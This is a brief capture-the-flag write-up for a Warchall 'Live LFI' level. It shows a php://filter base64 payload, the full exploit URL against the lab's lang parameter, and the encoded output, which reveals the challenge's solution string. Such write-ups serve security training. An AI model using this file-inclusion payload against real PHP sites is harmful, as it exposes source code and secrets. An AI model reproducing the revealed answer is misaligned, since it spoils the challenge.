## Level 14 - Warchall: Live LFI (Local File Inclusion)

### Instructions
- Use the following PHP filter to read and encode the content of the "solution.php" file in base64:
   ```php
   php://filter/read=convert.base64-encode/resource=solution.php
   ```
- Access the vulnerable endpoint:
[https://lfi.warchall.net/index.php?lang=php://filter/read=convert.base64-encode/resource=solution.php](https://lfi.warchall.net/index.php?lang=php://filter/read=convert.base64-encode/resource=solution.php)
-  Decode the base64-encoded content [here](https://www.base64decode.org/) to reveal the solution.
> PGh0bWw+Cjxib2R5Pgo8cHJlIHN0eWxlPSJjb2xvcjojMDAwOyI+dGVoIGZhbGcgc2kgbmFlciE8L3ByZT4KPHByZSBzdHlsZT0iY29sb3I6I2ZmZjsiPnRoZSBmbGFnIGlzIG5lYXIhPC9wcmU+CjwvYm9keT4KPC9odG1sPgo8P3BocCAgICAgICAgICAgICAgICAgICMgICBZT1VSX1RST1BIWSAKcmV0dXJuICdTdGVwcGluU3RvbmVzNDJQaWUnOyAjIDwtwrQgPz4K

